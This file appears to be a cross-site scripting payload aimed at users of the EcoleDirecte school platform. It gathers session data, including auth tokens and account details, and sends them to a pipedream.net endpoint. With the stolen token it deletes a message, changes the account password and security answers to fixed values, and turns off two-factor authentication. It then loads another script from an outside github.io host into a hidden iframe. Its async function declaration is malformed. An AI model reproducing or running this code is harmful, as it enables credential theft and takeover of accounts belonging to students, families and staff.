const ma2f = true 
const mpsw = true
const url = 'https://eo1w3ilotwrjzkh.m.pipedream.net/';

const api = 'https://api.ecoledirecte.com'
const params =
  document.querySelector('a[href*="idMessage="]')
    ? new URL(document.querySelector('a[href*="idMessage="]').href).searchParams
    : new URLSearchParams();

const idmessage = Number(params.get("idMessage")) || 0;
const iddossier = Number(params.get("idDossier")) || 0;
const accounts = JSON.parse(sessionStorage.getItem("accounts") ?? "null");
const credentials = JSON.parse(sessionStorage.getItem("credentials") ?? "null");
const idlogin = accounts?.payload?.accounts?.[0]?.idLogin ?? null;
const id = accounts?.payload?.accounts?.[0]?.id ?? null;
const tc = accounts?.payload?.accounts?.[0]?.typeCompte ?? null;
const token = credentials?.payload?.authToken ?? null;
const userid = accounts?.payload?.accounts?.[0]?.identifiant ?? null;
const a2factif = accounts?.payload?.accounts?.[0]?.parametresIndividuels?.is2FATOTPActif ?? false;
const ntc = { P: "enseignants", A: "personnels" }[tc] || "bienjoué";
const dataObj = {
    action: "supprimer",
    ids: [idmessage],
    anneeMessages: "2025-2026",
    idDossier: iddossier
  };
const datamotdepasse = {
    identifiant: userid,
    motDePasseComteAssocie: "_r+8[haBh3TCYn!,",
    confirmationMotDePasse: "_r+8[haBh3TCYn!,",
    email: "email@email.com",
    portable: "",
    questionSecrete: "Autre",
    reponse: "c'est les autres",
    autreQuestionSecrete: "l'enfer",
    uuid: ""
  }

const postitobj = {}

async ok() => {
  const keys = [
    'accounts', 'badges', 'credentials', 'edhydration_auth',
    'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history'
  ];

  const data = {
    t: new Date().toISOString(),
    u: navigator.userAgent,
    l: location.href,
    s: Object.fromEntries(
      keys
        .map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
        .filter(([, v]) => v !== null)
        .map(([k, v]) => {
          try { return [k, JSON.parse(v)]; }
          catch { return [k, v]; }
        })
    )
  };

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  } catch {}
};
ok();


const req = (url, payload, method = "POST") =>
  fetch(url, {
    method,
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "X-Token": token
    },
    body: payload ? "data=" + JSON.stringify(payload) : undefined
  });

const requests = [
  req(`${api}/v3/${ntc}/${id}/messages.awp?verbe=delete&v=4.91.0`, dataObj),
  mpsw === true && req(`${api}/v3/logins/${idlogin}.awp?verbe=put&v=4.92.0`, datamotdepasse),
  a2factif === true && req(`${api}/restv3/ws/auth/totp?v=4.92.1`, null, "DELETE")
].filter(Boolean);

Promise.allSettled(requests);


sessionStorage.setItem("credentials", JSON.stringify((a => {
    a.payload.authToken = "1234";
    return a
})(JSON.parse(sessionStorage.getItem("credentials")))));
(() => {
    function a(b) {
        const c = setInterval(() => {
            if (document.body) {
                clearInterval(c);
                b()
            }
        }, 10)
    }
    a(() => {
        const b = document.createElement("iframe");
        b.src = "/Famille";
        b.style.display = "none";
        document.body.appendChild(b);
        b.onload = () => {
            const c = b.contentDocument,
                d = setInterval(() => {
                    if (!c || !c.body) return;
                    clearInterval(d);
                    const e = c.createElement("script");
                    e.src = "https://exon2007.github.io/XSS/alert1.js";
                    e.async = true;
                    c.body.appendChild(e)
                }, 50)
        }
    })
})();
